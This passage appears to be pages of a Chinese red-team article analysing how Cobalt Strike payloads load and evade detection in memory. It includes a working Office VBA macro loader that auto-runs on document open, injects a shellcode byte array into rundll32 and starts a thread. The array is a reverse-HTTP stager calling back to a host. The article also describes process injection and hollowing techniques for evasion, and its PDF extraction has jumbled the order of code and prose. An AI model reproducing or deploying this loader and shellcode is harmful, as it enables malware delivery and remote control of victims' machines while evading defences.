-95,-100,-77,-10,-98,-51,-47,5,-116,122,41,51,-104,-6,-67,-3,-52, _
37,125,-41,-96,-58,85,-68,23,-36,110,-4,-43,-118,-16,-89,-112,110,127,19,3,-79,-
84,46,126,114,-83,89,-118,82,98,12,97,41,-10,-81,4,34,-12,-77,16, _
-94,12,71,-113,106,57,-119,87,-44,11,1,-43,-21,82,66,22,-16,-89,56,-106,-3,110,6
4,-112,121,-41,86,28,28,63,-7,-58,-95,-90,16,82,-10,-112,-95,-103, _
-26,-37,98,124,-69,-113,97,-2,-103,56,-29,-31,-47,0,55,29,-25,-66,-73,-24,87,119
,53,74,82,85,-4,117,-28,-113,19,17,61,54,103,-64,8,96,-58,-40, _
-29,91,25,-76,-58,-49,13,-35,124,79,88,-70,85,18,31,-103,67,9,-94,-5,64,62,127,1
3,-13,27,-106,-9,-35,69,-80,-25,95,52,56,81,-41,70,94,40, _
102,70,-123,103,99,88,109,52,24,-108,100,-36,-122,-94,30,28,-113,-48,-22,29,97,5
,0,104,-16,-75,-94,86,-1,-43,106,64,104,0,16,0,0,104,0,0, _
64,0,87,104,88,-92,83,-27,-1,-43,-109,-71,0,0,0,0,1,-39,81,83,-119,-25,87,104,0,
32,0,0,83,86,104,18,-106,-119,-30,-1,-43,-123,-64,116, _
-58,-117,7,1,-61,-123,-64,117,-27,88,-61,-24,-119,-3,-1,-1,49,57,50,46,49,54,56,
46,49,46,52,49,0,1,-55,-61,127)
    If Len(Environ("ProgramW6432")) > 0 Then
        sProc = Environ("windir") & "\\SysWOW64\\rundll32.exe"
    Else
        sProc = Environ("windir") & "\\System32\\rundll32.exe"
    End If
    res = RunStuff(sNull, sProc, ByVal 0&, ByVal 0&, ByVal 1&, ByVal 4&, ByVal 
0&, sNull, sInfo, pInfo)
    rwxpage = AllocStuff(pInfo.hProcess, 0, UBound(myArray), &H1000, &H40)
    For offset = LBound(myArray) To UBound(myArray)
        myByte = myArray(offset)
        res = WriteStuff(pInfo.hProcess, rwxpage + offset, myByte, 1, ByVal 0&)
Author: L.N. / Date: 2021-09-07 Produced by AttackTeamFamily
No. 3 / 7 - Welcome to www.red-team.cn
这就是1-3步的loader，它启动了一个rundll32.exe的进程，然后在进程中申请了一块内存，并复制
Stager，进入内存，然后创建线程执行Stager。
Stager就是其中的myArray：
    Next offset
    res = CreateStuff(pInfo.hProcess, 0, 0, rwxpage, 0, 0, 0)
End Sub
Sub AutoOpen()
    Auto_Open
End Sub
Sub Workbook_Open()
    Auto_Open
End Sub
-4,-24,-119,0,0,0,96,-119,-27,49,-46,100,-117,82,48,-117,82,12,-117,82,20,-117,1
14,40,15,-73,74,38,49,-1,49,-64,-84,60,97,124,2,44,32,-63,-49, _
13,1,-57,-30,-16,82,87,-117,82,16,-117,66,60,1,-48,-117,64,120,-123,-64,116,74,1
,-48,80,-117,72,24,-117,88,32,1,-45,-29,60,73,-117,52,-117,1, _
-42,49,-1,49,-64,-84,-63,-49,13,1,-57,56,-32,117,-12,3,125,-8,59,125,36,117,-30,
88,-117,88,36,1,-45,102,-117,12,75,-117,88,28,1,-45,-117,4, _
-117,1,-48,-119,68,36,36,91,91,97,89,90,81,-1,-32,88,95,90,-117,18,-21,-122,93,1
04,110,101,116,0,104,119,105,110,105,84,104,76,119,38,7,-1, _
-43,-24,0,0,0,0,49,-1,87,87,87,87,87,104,58,86,121,-89,-1,-43,-23,-92,0,0,0,91,4
9,-55,81,81,106,3,81,81,104,-69,1,0,0,83, _
80,104,87,-119,-97,-58,-1,-43,80,-23,-116,0,0,0,91,49,-46,82,104,0,50,-64,-124,8
2,82,82,83,82,80,104,-21,85,46,59,-1,-43,-119,-58,-125,-61, _
80,104,-128,51,0,0,-119,-32,106,4,80,106,31,86,104,117,70,-98,-122,-1,-43,95,49,
-1,87,87,106,-1,83,86,104,45,6,24,123,-1,-43,-123,-64,15, _
-124,-54,1,0,0,49,-1,-123,-10,116,4,-119,-7,-21,9,104,-86,-59,-30,93,-1,-43,-119
,-63,104,69,33,94,49,-1,-43,49,-1,87,106,7,81,86,80,104, _
-73,87,-32,11,-1,-43,-65,0,47,0,0,57,-57,117,7,88,80,-23,123,-1,-1,-1,49,-1,-23,
-111,1,0,0,-23,-55,1,0,0,-24,111,-1,-1,-1,47, _
51,76,114,107,0,-109,-91,-125,30,-110,69,-22,-15,61,-39,25,45,22,28,-86,75,-98,-
50,89,-113,112,46,-124,28,53,96,27,-98,111,65,105,-36,-127,85,-18, _
34,1,86,46,84,-52,-79,-4,71,-47,74,-83,59,-113,59,-124,119,-8,49,-116,44,-127,11
2,17,19,19,75,28,-112,75,91,-26,80,15,-122,25,96,-98,0,85, _
115,101,114,45,65,103,101,110,116,58,32,77,111,122,105,108,108,97,47,52,46,48,32
,40,99,111,109,112,97,116,105,98,108,101,59,32,77,83,73,69, _
32,55,46,48,59,32,87,105,110,100,111,119,115,32,78,84,32,53,46,49,59,32,46,78,69
,84,32,67,76,82,32,49,46,49,46,52,51,50,50,41, _
13,10,0,84,-98,-33,90,-46,51,-110,12,-47,40,-16,-113,18,-41,62,98,67,65,-96,-54,
-95,-100,-77,-10,-98,-51,-47,5,-116,122,41,51,-104,-6,-67,-3,-52, _
37,125,-41,-96,-58,85,-68,23,-36,110,-4,-43,-118,-16,-89,-112,110,127,19,3,-79,-
84,46,126,114,-83,89,-118,82,98,12,97,41,-10,-81,4,34,-12,-77,16, _
-94,12,71,-113,106,57,-119,87,-44,11,1,-43,-21,82,66,22,-16,-89,56,-106,-3,110,6
4,-112,121,-41,86,28,28,63,-7,-58,-95,-90,16,82,-10,-112,-95,-103, _
-26,-37,98,124,-69,-113,97,-2,-103,56,-29,-31,-47,0,55,29,-25,-66,-73,-24,87,119
,53,74,82,85,-4,117,-28,-113,19,17,61,54,103,-64,8,96,-58,-40, _
-29,91,25,-76,-58,-49,13,-35,124,79,88,-70,85,18,31,-103,67,9,-94,-5,64,62,127,1
3,-13,27,-106,-9,-35,69,-80,-25,95,52,56,81,-41,70,94,40, _
102,70,-123,103,99,88,109,52,24,-108,100,-36,-122,-94,30,28,-113,-48,-22,29,97,5
,0,104,-16,-75,-94,86,-1,-43,106,64,104,0,16,0,0,104,0,0, _
64,0,87,104,88,-92,83,-27,-1,-43,-109,-71,0,0,0,0,1,-39,81,83,-119,-25,87,104,0,
32,0,0,83,86,104,18,-106,-119,-30,-1,-43,-123,-64,116, _
Author: L.N. / Date: 2021-09-07 Produced by AttackTeamFamily
No. 4 / 7 - Welcome to www.red-team.cn
这是一段shellcode，就是http协议的下载者，和msf是一样的，使用的是HD moore（msf创始人之
一，比特币早期持有者，羡慕死了）写的shellcode，也就是这个汇编代码https://github.com/rapid7/
metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/block/block_reve
rse_http.asm
3-6步执行的就是如上的Stager，7-8步时执行的加密的payload，前面说了这个所谓的加密payload，分
为加密部分和不加密部分。加密部分使用xor亦或，加密的是Beacon.dll，具体代码在CS的
XorEncoder.java中，小伙伴可以自己阅读下。以前CS使用单字节加密，很容易被yara给解密了，后面
使用了多字节。不加密部分就是一段解密Xor代码，也是汇编代码，感兴趣的小伙伴到视频的13:20秒去
阅读下。
最后9-11步时反射DLL的执行，这个代码也是开源的https://github.com/stephenfewer/ReflectiveDLLI
njection。这就是分段加载payload的加载细节。我们通过process hacker去查看内存，就会发现3个可
读可写可执行的内存，对应上了我们上面步骤中3次的内存申请，4k的是stager、4096k的是加密
payload、268k的是反射dll。
这是分段的，那么不分段的呢？
1. 申请一个块儿内存（allocate memory）
2. 复制Stager去这一块儿内存里
3. 创建一个线程，运行这个Stager
4. 这个Stager会再次申请一块儿内存
5. Stager去下载加密的payload，写入申请的内存中
6. Stager把执行流程转递给这个加密的payload
7. 加密的payload自解密成Reflective DLL
-58,-117,7,1,-61,-123,-64,117,-27,88,-61,-24,-119,-3,-1,-1,49,57,50,46,49,54,56,
46,49,46,52,49,0,1,-55,-61,127
Author: L.N. / Date: 2021-09-07 Produced by AttackTeamFamily
No. 5 / 7 - Welcome to www.red-team.cn
8. 然后把执行流程传递给Reflective DLL
9. Reflective DLL 申请一个块儿内存
10. 然后初始化自己在新的内存里面
11. 最后reflective DLL 调用payload的入口点函数
Stage = Relective DLL
不分阶段比分阶段少了很多内存操作流程，也就少调用了很多API，因此比较OPSEC，作者给了一张CS
中Artifact(loader)的行为图：
在不分阶段的Payload的执行步骤中，我们可以看出1-3其实就是Artifact Kit/Resource Kit可以自定义
的，9-11还是我们不太能控制的，我，希望CS早日开放这块儿的控制。
0x02 进程注入在CS中的应用
进程注入这个流程玩CS的小伙伴应该倒背如流了，打开远程进程->分配内存,复制程序去内存->创建线程
执行。这个是经典注入，CS也使用了Process hollowing技术，详细的技术阅读@idiotc4t同学的这篇文
章https://idiotc4t.com/code-and-dll-process-injection/process-hollowing。CS使用的process 
hollowing略有区别，作者称为丐版Process hollowing，流程是，打开远程进程->分配内存,复制程序去
内存->劫持存在的线程运行程序（有人叫线程劫持，不管叫什么，知道技术原理最重要）。
Process hollowing 比经典注入更加OPSEC，对比如图：
Author: L.N. / Date: 2021-09-07 Produced by AttackTeamFamily
No. 6 / 7 - Welcome to www.red-team.cn
0x03 总结
In-memory Evasion 2 主要讲诉的还是A payload's life。梳理清楚payload在内存中的执行流程的每个
细节，然后再拆解到CS的自定义功能中，非常有利于我们做对抗。最后的进程注入技术，虽然略显老
旧，现在已经出现了各种新的进程注入技术例如：Process Doppelgänging、Process Ghosting等等。
Author: L.N. / Date: 2021-09-07 Produced by AttackTeamFamily
No. 7 / 7 - Welcome to www.red-team.cn